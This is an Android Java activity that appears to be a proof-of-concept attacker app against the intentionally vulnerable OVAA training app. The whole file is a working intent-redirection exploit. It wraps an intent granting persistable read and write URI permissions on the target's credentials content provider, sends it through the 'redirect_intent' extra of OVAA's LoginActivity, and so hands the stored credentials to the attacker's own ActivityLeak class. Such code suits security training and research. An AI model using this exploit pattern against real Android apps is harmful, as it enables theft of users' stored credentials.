package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent extra = new Intent();
        extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
                | Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        extra.setClassName(getPackageName(), "com.example.myapplication.ActivityLeak");
        extra.setData(Uri.parse("content://oversecured.ovaa.creds_provider/"));

        Intent intent = new Intent();
        intent.setClassName("oversecured.ovaa", "oversecured.ovaa.activities.LoginActivity");
        intent.putExtra("redirect_intent", extra);
        startActivity(intent);

    }
}